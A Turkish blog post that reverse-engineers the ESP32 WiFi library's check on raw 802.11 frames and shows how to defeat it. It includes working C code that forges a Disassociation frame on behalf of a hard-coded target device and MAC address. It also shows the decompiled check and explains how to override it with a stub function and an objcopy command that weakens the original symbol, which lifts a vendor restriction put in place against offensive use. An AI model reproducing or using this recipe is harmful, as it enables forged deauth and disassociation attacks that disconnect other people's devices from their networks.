---
layout: post
title: "ESP32 WiFi Kütüphanesinde Deauth Check Bypass"
date: 2026-10-18
---

# ESP32 de WiFi Send İşlemleri
"esp_wifi.h" header ı ile fonksiyon tanımına eriştiğimiz esp_wifi_80211_tx fonksiyonu esp wifi standart kütüphanesinde dışarıya wifi frame gönderebilmemizi sağlayan en temel fonksiyondur. İmzası şu şekildedir:  
```c
esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);
```

Basit bir kullanım örneği şöyle olabilir:
```c
#include <string.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_log.h"
#include "nvs_flash.h"

#define TAG "RAW_TX_EXAMPLE"

void send_raw_probe_request(void)
{
    // Örnek bir 802.11 Probe Request çerçevesi oluşturalım.
    // Gerçek bir pakette MAC başlığı kurallarına tam uyulmalıdır (Frame Control, Duration, Addr1, Addr2, Addr3, Sequence Control).
    uint8_t packet[128];
    memset(packet, 0, sizeof(packet));

    // 1. Frame Control (2 bytes): 0x0040 -> Management Frame, Subtype: Probe Request
    packet[0] = 0x40; 
    packet[1] = 0x00;
    
    // 2. Duration (2 bytes): 0x0000
    packet[2] = 0x00;
    packet[3] = 0x00;
    
    // 3. Address 1 - Destination MAC (Broadcast: ff:ff:ff:ff:ff:ff) (6 bytes)
    memset(&packet[4], 0xFF, 6);
    
    // 4. Address 2 - Source MAC (ESP32'nin veya sahte bir MAC adresi) (6 bytes)
    uint8_t src_mac[6] = {0x24, 0x0A, 0xC4, 0x11, 0x22, 0x33};
    memcpy(&packet[10], src_mac, 6);
    
    // 5. Address 3 - BSSID (Broadcast) (6 bytes)
    memset(&packet[16], 0xFF, 6);
    
    // 6. Sequence Control (2 bytes) -> en_sys_seq = true olduğu için burayı 0 bırakabiliriz, sürücü dolduracaktır.
    packet[22] = 0x00;
    packet[23] = 0x00;

    int packet_len = 24;

    // Paketi STA arayüzü üzerinden gönder
    // en_sys_seq = true -> Sequence kontrolünü Wi-Fi donanımı/sürücüsü yönetir.
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, packet, packet_len, true);
    
    if (err == ESP_OK) {
        ESP_LOGI(TAG, "802.11 ham paketi başarıyla iletildi.");
    } else {
        ESP_LOGE(TAG, "Paket gönderilemedi! Hata: %s", esp_err_to_name(err));
    }
}

void app_main(void)
{
    // NVS Flash'ı başlat (Wi-Fi sürücüsü için gereklidir)
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);

    // Ağ arayüzünü ve Wi-Fi'ı başlat
    ESP_ERROR_CHECK(esp_netif_init());
    ESP_ERROR_CHECK(esp_event_loop_create_default());
    
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));

    // Wi-Fi modunu STA olarak ayarla ve başlat
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
    ESP_ERROR_CHECK(esp_wifi_start());

    // Paket göndermeden önce hedef Wi-Fi kanalını ayarlamak gerekebilir (Örn: Kanal 6)
    ESP_ERROR_CHECK(esp_wifi_set_channel(6, WIFI_SECOND_CHAN_NONE));

    vTaskDelay(pdMS_TO_TICKS(1000));
    send_raw_probe_request();
}
```
Yukardaki kodda Broadcast Probe Request örneği görüyorsunuz. Bu frame i algılayan tüm AP(Access Point) ler bize Probe Response gönderecektir. Ama biz bunla şimdilik ilgilenmiyoruz. Esas ilgimizi çeken "esp_wifi_80211_tx" fonksiyonu. Bu fonksiyon bu senaryoda kendisinden beklenen işlemi harfiyen yerine getirecek ve wifi frame ini driver a iletecektir. Ama bu her zaman bu kadar kolay olmayacak. İkinci örneğimize geçelim.  


```c
#include <stdio.h>
#include <string.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_err.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_netif.h"
#include "nvs_flash.h"

#define WIFI_CHANNEL 8

// Hedef Bilgileri
static const uint8_t target_bssid[6] = { 0x38, 0x16, 0x5A, 0x32, 0x11, 0x70 };
static const uint8_t target_device[6] = { 0x4A, 0x06, 0x04, 0xF4, 0xA0, 0x79 };

void send_single_disassoc(void)
{
    uint8_t packet[26] = {
        0xA0, 0x00,            // Frame Control (Disassociation)
        0x00, 0x00,            // Duration
        // Address 1 (DST): Modem BSSID
        target_bssid[0], target_bssid[1], target_bssid[2], target_bssid[3], target_bssid[4], target_bssid[5],
        // Address 2 (SRC): Target Device MAC
        target_device[0], target_device[1], target_device[2], target_device[3], target_device[4], target_device[5],
        // Address 3 (BSSID): Modem BSSID
        target_bssid[0], target_bssid[1], target_bssid[2], target_bssid[3], target_bssid[4], target_bssid[5],
        0x00, 0x00,            // Sequence Control
        0x08, 0x00             // Reason Code 8
    };

    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), true);
    if (err == ESP_OK) {
        printf("Disassoc Gonderildi!\n");
    } else {
        printf("Paket gonderilemedi! Hata: %d\n", err);
    }
}

void app_main(void)
{
    // Temel sistem ve Wi-Fi başlatma adımları
    ESP_ERROR_CHECK(nvs_flash_init());
    ESP_ERROR_CHECK(esp_netif_init());
    ESP_ERROR_CHECK(esp_event_loop_create_default());

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
    ESP_ERROR_CHECK(esp_wifi_start());
    ESP_ERROR_CHECK(esp_wifi_set_channel(WIFI_CHANNEL, WIFI_SECOND_CHAN_NONE));

    printf("Wi-Fi baslatildi. Disassoc paketi gonderiliyor...\n");

    // Wi-Fi sürücüsünün oturması için kısa bir gecikme
    vTaskDelay(pdMS_TO_TICKS(500));

    send_single_disassoc();
}
```

Yukardaki örnekte gene aynı şekilde tek bir frame göndermeye çalışıyoruz gönderdiğimiz frame tipi bu sefer Disassociation. Bu frame in amacı STA yı yani cihazımızın AP ile kurduğu oturumu sonlandırmaktır. Telefonunuz yada bilgisayarınız ile ağdan çıkmak için WiFi yi kapattığınızı düşünün. Bu noktada gönderilen paket işte budur. Paketi alan router sizi ağdan çıkarır. Bu frame tipinin red team ciler tarafından çok bilinen popüler bir frame tipi olan Deauthentication dan farkına da izninizle değinmek isterim belki yazıyı okuyan bazılarınızın ilgisini çeker.  

WiFi üzerinden AP mize router ımza bağlanmak istediğimizde 3 State den oluşan bir sisteme gireriz:  
State 1: doğrulanmamış ve ilişkilendirilmemiş  
State 2: doğrulanmış ama ilişkilendirilmemiş  
State 3: doğrulanmış(authenticated) ve ilişkilendirilmiş(associated)  

(Bu state lerde bahsedilen doğrulama aklınızdan geçen o şifre ve kriptolojik işlemlerden alakasız cihazın router a ben sana bağlanmak istiyorum demesinden ibaret bir olaydır.)   

İşte Disassociation ve Deauthentication frame leride bu state lerde geri gitmemizi sağlar. Disassociation frame ini cihaz adına AP ye atarsak AP o cihazı state 2 ye geri çeker. Deauthentication frame ini gönderir isek bu sefer State 1 e geri çeker. Deauthentication un red team ciler tarafından daha çok sevilmesinin sebebi de tam olarak budur. Daha fazla derde yol açar. Neyse bu küçük bilgi akışından sonra ana konumuza geri dönebiliriz.  

Disassociation frame ini esp_wifi_80211_tx fonksiyonu ile driver a iletmeye çalıştığımızda yukardaki kodda alacağımız çıktı:  
![disassoc](/pictures/deauth/disassoc1.png)

Resimde gördüğünüz kırmızı uyarı bizzat esp32 nin libnet80211.a statik kütüphanesinden geliyor. Dönüş değeri 258 ile bu paketin desteklenmeyen bir paket olarak işaretlendiğini görüyoruz. Bunun sebebi esp32 nin saldırgan amaçla kullanılmasının önüne geçmek. Çünkü Disassociation frame ini bir cihaz adına router a gönderip bağlantı ilişiğimi kesmek istiyorum diyebiliriz yada bizzat router dan geliyormuş gibi cihazın ilişiğini kesebiliriz. Bu yüzden esp32 tarafından izin verilen paket kapsamına girmiyor bu paket. Tahmin edersiniz ki Deauthentication frame e de aynı şekilde izin verilmiyor. Peki bu kontrol nerde? Bunu bulabilmek için bahsi geçen statik kütüphanemizin içinde bu fonksiyonların tamınladığı object i buldum ve Ghidra ya attım. libnet80211.a/ieee80211_output.o:  
```c
esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx,ieee80211_frame_t *buffer,int len,bool en_sys_seq)
{
  undefined1 uVar1;
  uint uVar2;
  int ret;
  int iVar3;
  undefined1 *puVar4;
  uint uVar5;
  uint *puVar6;
  
  uVar2 = (uint)ifx;
  ret = ieee80211_raw_frame_sanity_check(ifx,buffer,len,en_sys_seq);
  if (ret == 0) {
    (**(code **)(_g_osi_funcs_p + 0x54))(_g_wifi_global_lock);
    iVar3 = ic_ebuf_alloc(buffer,1,len);
    if (iVar3 == 0) {
      (**(code **)(_g_osi_funcs_p + 0x58))(_g_wifi_global_lock);
      ret = 0x101;
    }
    else {
      puVar4 = (undefined1 *)chm_get_current_channel();
      chm_get_band_from_chan(*puVar4);
      *(short *)(iVar3 + 0x16) = (short)len + -0x18;
      memw();
      puVar6 = *(uint **)(iVar3 + 0x2c);
      *(undefined2 *)(iVar3 + 0x14) = 0x18;
      memw();
      *puVar6 = *puVar6 | 0x4000;
      memw();
      uVar5 = ic_get_default_sched();
      puVar6[7] = uVar5;
      memw();
      uVar1 = ic_get_80211_tx_rate(uVar2);
      puVar6 = *(uint **)(iVar3 + 0x2c);
      *(undefined1 *)(puVar6 + 3) = uVar1;
      memw();
      if (uVar2 == 0) {
        uVar5 = (uint)(DAT_000162ae == '\x02');
        memw();
      }
      else {
        uVar5 = 1;
        if (DAT_000162aa != '\x02') {
          uVar5 = 0;
        }
      }
      puVar6[2] = puVar6[2] & 0xffff7fff | uVar5 << 0xf;
      if (en_sys_seq) {
        *puVar6 = *puVar6 | 1;
      }
      puVar6[4] = puVar6[4] & 0xfff3ffff | (uVar2 & 3) << 0x12;
      puVar6[5] = 0x100;
      memw();
      ieee80211_post_hmac_tx(iVar3);
      (**(code **)(_g_osi_funcs_p + 0x58))(_g_wifi_global_lock);
    }
  }
  return ret;
}


```

"ieee80211_raw_frame_sanity_check" bu fonksiyona frame imiz gönderiliyor ve dönen cevap 0 değil ise driver işlemlerine hiç girmeden return ediyor "esp_wifi_80211_tx" yani kontrolün yapıldığı fonksiyonu bulduk. sanity_check de neler oluyor bakalım:  

```c
undefined4 ieee80211_raw_frame_sanity_check (wifi_interface_t ifx,ieee80211_frame_t *buffer,int len,bool en_sys_seq4)
{
  undefined4 ret;
  int iVar1;
  int iVar2;
  byte bVar3;
  byte bVar4;
  char *pcVar5;
  byte type;
  byte subtype;
  undefined1 auStack_40 [16];
  int iStack_30;
  
  if (buffer == (ieee80211_frame_t *)0x0) {
    wifi_log(1,0x40,1,"invalid buffer");
    return 0x102;
  }
  if (((uint)len < 0x18) || (0x5dc < len)) {
    wifi_log(1,0x40,1,"invalid buffer length: %d",len);
    return 0x102;
  }
  (**(code **)(_g_osi_funcs_p + 0x54))(_g_wifi_global_lock);
  iVar1 = _config_is_cache_tx_buf_enabled;
  if (((ifx != WIFI_IF_STA) && (iVar1 = _ic_ebuf_alloc, ifx != WIFI_IF_AP)) || (iVar1 == 0)) {
    wifi_log(1,0x40,1,"invalid interface %d",ifx);
    ret = 0x3004;
    goto LAB_00013222;
  }
  bVar3 = buffer->frame_control[0];
  type = bVar3 & 0xc;
  subtype = bVar3 & 0xf0;
  pcVar5 = "invalid frame control, unsupport crypto frame";
  if ((buffer->frame_control[1] & 0x40) == 0) {
    if (type == 8) {
      if (-1 < (char)subtype) goto LAB_00013185;
      pcVar5 = "unsupport QoS frame type: %x%x";
    }
    else {
      if ((bVar3 & 0xc) == 0) {
        bVar4 = type;
        if ((bVar3 & 0xe0) != 0x40) {
          bVar4 = 1;
        }
        if (bVar4 != 0) {
          bVar3 = 1;
          if (subtype == 0x80) {
            bVar3 = type;
          }
          if ((bVar3 != 0) && (subtype != 0xd0)) goto LAB_00013164;
        }
LAB_00013185:
        memw();
        iStack_30 = iVar1;
        wifi_get_macaddr(ifx,auStack_40);
        iVar1 = memcmp(auStack_40,buffer->addr2,6);
        if (ifx == WIFI_IF_STA) {
          if ((*(int *)(iStack_30 + 0xe4) == 0) ||
             (iVar2 = memcmp((void *)(*(int *)(iStack_30 + 0xe4) + 4),buffer->addr1,6), iVar2 != 0))
          goto LAB_00013212;
        }
        else {
          iVar2 = cnx_node_search(buffer->addr1);
          if (iVar2 == 0) goto LAB_00013212;
        }
        if (iVar1 != 0) goto LAB_00013212;
        pcVar5 = "en_sys_seq should be true to avoid side-effect to WiFi connection";
        if (en_sys_seq4) {
          pcVar5 = "invalid frame control, retry/power/frag/more data bit should not set";
          if ((buffer->frame_control[1] & 0x3c) == 0) {
            if ((buffer->frame_control[0] & 0xc) != 8) {
LAB_00013212:
              (**(code **)(_g_osi_funcs_p + 0x58))(_g_wifi_global_lock);
              return 0;
            }
            bVar3 = buffer->frame_control[1] & 3;
            if (ifx == WIFI_IF_STA) {
              pcVar5 = "invalid frame control, sta->ap ToDS should be 1, FromDS should be 0";
              if (bVar3 == 1) goto LAB_00013212;
            }
            else {
              if (bVar3 == 2) goto LAB_00013212;
              pcVar5 = "invalid frame control, ap->sta ToDS should be 0, FromDS should be 1";
            }
          }
        }
        goto LAB_000131ff;
      }
LAB_00013164:
      pcVar5 = "unsupport frame type: %x%x";
    }
    wifi_log(1,0x40,1,pcVar5);
  }
  else {
LAB_000131ff:
    wifi_log(1,0x40,1,pcVar5);
  }
  ret = 258;
LAB_00013222:
  (**(code **)(_g_osi_funcs_p + 0x58))(_g_wifi_global_lock);
  return ret;
}
```

Kontrollerin bizi şuanlık ilgilendiren kısım:  
```c
      if ((bVar3 & 0xc) == 0) {
        bVar4 = type;
        if ((bVar3 & 0xe0) != 0x40) {
          bVar4 = 1;
        }
        if (bVar4 != 0) {
          bVar3 = 1;
          if (subtype == 0x80) {
            bVar3 = type;
          }
          if ((bVar3 != 0) && (subtype != 0xd0)) goto LAB_00013164;
```

Burası. "bVar3 & 0xc" nin 0 olması frame type ımızın Management olduğu anlamına geliyor.  
(bVar3 & 0xe0) != 0x40 bu koşula girebilmemiz için:  
0x40: Probe Request  
0x50: Probe Response  

bu paket tiplerinden biri olmamız lazım değilsek kontroller devam ediyor.  
"subtype == 0x80" -> 0x80: Beacon Frame  
LAB_00013164 label ına gitmemenin kalan tek yolu da (subtype == 0xd0) o da:  
0xd0: Action Frame  

Yani insan gözü ile kolay anlaşılacak bir hale getirirsek burdaki kontrol yığını tam olarak şu:  
```c
if (type == WIFI_FRAME_MGMT) {

    if (subtype != WIFI_MGMT_PROBE_REQ  &&
        subtype != WIFI_MGMT_PROBE_RESP &&
        subtype != WIFI_MGMT_BEACON     &&
        subtype != WIFI_MGMT_ACTION) {

        //unsupport frame type: %x
        goto LAB_00013164;
    }
    goto LAB_00013185;
}
```
Burdan da esp32 nin resmi wifi kütüphanesinin "esp_wifi_80211_tx" fonksiyonu ile Management frame leri arasından sadece WIFI_MGMT_PROBE_REQ, WIFI_MGMT_PROBE_RESP, WIFI_MGMT_BEACON ve WIFI_MGMT_ACTION frame lerini göndermemize izin verdiği anlaşılıyor. Peki bu kısıtı kaldırmak için kullanabileceğimiz yöntemler nedir? Patch tabiki yapılabilir. Ama görece daha temiz bir yol da var o da sembol ezmek.  
ESP-IDF ortamında build yaptığınız zaman aynı isimde iki fonksiyon kesişirse sembol tiplerine bakılıyor. Strong ise iki sembol linker hatası alırsınız. Biri weak ise strong olan kullanılır. İkiside weak ise ilk tanımlanan kullanılır. Bu sadece ESP-IDF e ait bir olay değil esasen çoğu linker bu şekilde çalışıyor. Biz bu özelliği kullanarak "ieee80211_raw_frame_sanity_check" fonksiyonunu yeniden tanımlıcaz. Yukarda verdiğim çalıştırdığımızda unsupported frame type aldığımız kodumuzun üst kısmına şu fonksiyon tanımını ekleyelim:  

```c
int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0; 
}
```
Evet dönüş değeri ve parametre tipleri tam doğru değil ama bu çokta umrumuzda değil uzunlukları aynı olsun yeter.  
Koda bunu ekleyip build işlemini yapalım bakalım.  

```
C:/Espressif/tools/xtensa-esp-elf/esp-14.2.0_20260121/xtensa-esp-elf/bin/../lib/gcc/xtensa-esp-elf/14.2.0/../../../../xtensa-esp-elf/bin/ld.exe: C:/Espressif/frameworks/esp-idf-v5.5.5/components/esp_wifi/lib/esp32/libnet80211.a(ieee80211_output.o): in function `ieee80211_raw_frame_sanity_check':
(.text.ieee80211_raw_frame_sanity_check+0x5c): multiple definition of `ieee80211_raw_frame_sanity_check';
```

Gördüğünüz üzere iki tanımı linker kaldıramadı. Bunun sebebi ikisinin de strong olması. Şimdi esas tanımı weak e çevirmek için şu komutu çalıştıralım:  
`xtensa-esp-elf-objcopy --weaken-symbol=ieee80211_raw_frame_sanity_check libnet80211.a libnet80211_w.a`  çalışması için libnet80211 in olduğu dizine gitmeniz lazım hata mesajında yeri belli zaten. Bu komutu çalıştırınca aynı kütüphanenin _w eki eklenmiş "ieee80211_raw_frame_sanity_check" fonksiyonu sembolü weak e döndürülmüş bir kopyasını alacaksınız. Eskisini kaydetmek istiyorsanız _old falan ekleyin sonra _w ekini silin. Şimdi derleme işlemimi tekrar denediğinizde başarılı olacaktır.  
![disassoc2](/pictures/deauth/disassoc2.png)

Umarım faydalı olur size bu, selametle kalın.